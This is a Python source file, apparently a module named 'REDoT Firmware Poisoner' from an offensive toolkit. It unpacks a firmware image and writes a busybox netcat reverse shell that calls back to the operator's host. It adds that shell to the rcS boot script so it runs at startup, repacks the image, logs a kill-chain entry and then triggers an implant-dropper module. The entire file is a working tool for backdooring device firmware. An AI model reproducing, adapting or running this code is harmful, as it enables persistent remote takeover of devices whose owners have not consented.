#!/usr/bin/env python3
# modules/firmware/firmware_poisoner.py

import os
import argparse
import subprocess
import shutil
from datetime import datetime
import socket
import json

FIRMWARE_DIR = "firmware"
REPORTS_DIR = "reports"
DEFAULT_FIRMWARE = os.path.join(FIRMWARE_DIR, "image.bin")
MOD_DIR = os.path.join(FIRMWARE_DIR, "mod")
OUTPUT_IMAGE = os.path.join(FIRMWARE_DIR, "image_poisoned.bin")
KILLCHAIN_LOG = os.path.join(REPORTS_DIR, "killchain.json")
AUTO_PAYLOAD_NAME = "init_reverse.sh"

def ensure_environment():
    os.makedirs(FIRMWARE_DIR, exist_ok=True)
    os.makedirs(REPORTS_DIR, exist_ok=True)
    if not os.path.exists(DEFAULT_FIRMWARE):
        with open(DEFAULT_FIRMWARE, "wb") as f:
            f.write(b'\x00' * 1024)
        print(f"[!] Placeholder firmware created at {DEFAULT_FIRMWARE} (replace with real image)")

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def generate_payload(lhost, lport):
    payload = f"""#!/bin/sh
/bin/busybox nc {lhost} {lport} -e /bin/sh
"""
    path = os.path.join(MOD_DIR, AUTO_PAYLOAD_NAME)
    with open(path, "w") as f:
        f.write(payload)
    os.chmod(path, 0o755)
    return path

def unpack_firmware(firmware_path):
    print("[*] Unpacking firmware...")
    shutil.rmtree(MOD_DIR, ignore_errors=True)
    os.makedirs(MOD_DIR, exist_ok=True)
    subprocess.run(["binwalk", "-e", firmware_path], check=True)
    for root, dirs, _ in os.walk(FIRMWARE_DIR):
        for d in dirs:
            if "squashfs-root" in d:
                squash_path = os.path.join(root, d)
                shutil.copytree(squash_path, MOD_DIR, dirs_exist_ok=True)
                return
    raise Exception("SquashFS root not found")

def inject_payload(payload_path):
    print("[*] Injecting payload into init scripts...")
    init_script = os.path.join(MOD_DIR, "etc", "init.d", "rcS")
    if not os.path.exists(init_script):
        raise Exception("rcS init script not found")
    with open(init_script, "a") as f:
        f.write(f"\n/bin/sh /etc/init.d/{AUTO_PAYLOAD_NAME} &\n")
    shutil.copy(payload_path, os.path.join(MOD_DIR, "etc", "init.d"))

def repack_firmware():
    print("[*] Repacking firmware...")
    squash_path = os.path.join(FIRMWARE_DIR, "squashfs.img")
    subprocess.run(["mksquashfs", MOD_DIR, squash_path, "-noappend", "-comp", "gzip"], check=True)
    shutil.copy(squash_path, OUTPUT_IMAGE)
    print(f"[+] Poisoned firmware image created: {OUTPUT_IMAGE}")

def log_killchain_entry(cve_id="N/A"):
    now = datetime.now().isoformat()
    entry = {
        "step": "5. Installation",
        "timestamp": now,
        "module": "firmware_poisoner",
        "description": "Payload injected into firmware image",
        "cve": cve_id
    }

    if os.path.exists(KILLCHAIN_LOG):
        with open(KILLCHAIN_LOG, "r") as f:
            data = json.load(f)
    else:
        data = []

    data.append(entry)
    with open(KILLCHAIN_LOG, "w") as f:
        json.dump(data, f, indent=2)
    print(f"[+] Kill chain log updated: {KILLCHAIN_LOG}")

def chain_followup_modules():
    print("[*] Triggering follow-up modules...")
    os.system("python3 modules/firmware/uart_extractor.py")
    os.system("python3 modules/payloads/implant_dropper.py --target-device poisoned_firmware")
    print("[+] Follow-up modules executed.")

def main():
    parser = argparse.ArgumentParser(description="REDoT Firmware Poisoner")
    parser.add_argument("--firmware", help="Firmware image to poison", default=DEFAULT_FIRMWARE)
    parser.add_argument("--lport", type=int, default=4444, help="Reverse shell port")
    parser.add_argument("--no-chain", action="store_true", help="Disable chaining to next modules")
    args = parser.parse_args()

    ensure_environment()

    if not os.path.exists(args.firmware):
        print(f"[!] Firmware not found: {args.firmware}")
        return

    lhost = get_local_ip()
    print(f"[*] Using LHOST: {lhost}")

    payload = generate_payload(lhost, args.lport)
    unpack_firmware(args.firmware)
    inject_payload(payload)
    repack_firmware()
    log_killchain_entry(cve_id="Custom-Payload")

    if not args.no_chain:
        chain_followup_modules()

if __name__ == "__main__":
    main()
